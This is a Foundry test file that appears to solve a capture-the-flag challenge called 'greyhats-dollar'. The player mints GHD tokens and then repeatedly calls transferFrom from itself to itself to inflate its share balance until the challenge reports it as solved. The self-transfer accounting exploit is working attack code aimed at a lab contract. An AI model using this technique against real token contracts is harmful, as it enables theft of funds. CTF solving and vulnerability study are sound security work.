// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/greyhats-dollar/Setup.sol";
import "src/greyhats-dollar/GHD.sol";
import "src/greyhats-dollar/lib/GREY.sol";

contract GreyHatsDollar is Test {
    Setup setup;
    address player = makeAddr("player");
    GHD ghd;
    GREY grey;

    function setUp() public {
        setup = new Setup();
        ghd = setup.ghd();
        grey = setup.grey();
    }

    function test_grayhats() public {
        vm.startPrank(player);
        setup.claim();

        assertEq(grey.balanceOf(player), 1000e18);
        grey.approve(address(ghd), type(uint256).max);
        ghd.mint(1000e18);
        console.log("sharesOfPlayer: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer2: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer3: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer4: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 1000e18);
        console.log("sharesOfPlayer5: %e", ghd.shares(player));
        ghd.transferFrom(player, player, 5_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        ghd.transferFrom(player, player, 10_000e18);
        bool isSolved = setup.isSolved();
        console.log("isSolved: %s", isSolved);
        vm.stopPrank();
    }
}
